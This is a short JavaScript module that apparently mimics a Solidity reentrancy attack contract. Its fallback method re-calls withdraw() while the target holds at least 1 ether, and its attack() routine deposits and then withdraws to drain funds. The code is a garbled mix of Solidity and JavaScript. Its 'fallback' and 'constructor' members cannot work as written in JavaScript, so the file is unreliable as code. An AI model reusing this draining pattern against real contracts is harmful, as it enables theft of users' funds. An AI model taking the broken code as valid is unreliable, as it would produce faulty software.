let depositFunds = require('./reentrancy-balance.js');

module.exports = class depositFunds {
    contract = {
        attack: {
            DepositFunds: null,
            constructor: function(_depositFundsAddress) {
                this.DepositFunds = depositFunds(_depositFundsAddress);
            },
            // Change web3 and ether
            fallback() {
                if (web3.eth.getBalance(this.DepositFunds.address) >= web3.toWei(1, "ether")) {
                    this.DepositFunds.withdraw();
                }
            },
            attack() {
                this.DepositFunds.deposit({value: web3.toWei(1, "ether")});
                this.DepositFunds.withdraw();
            }
        }
    }
}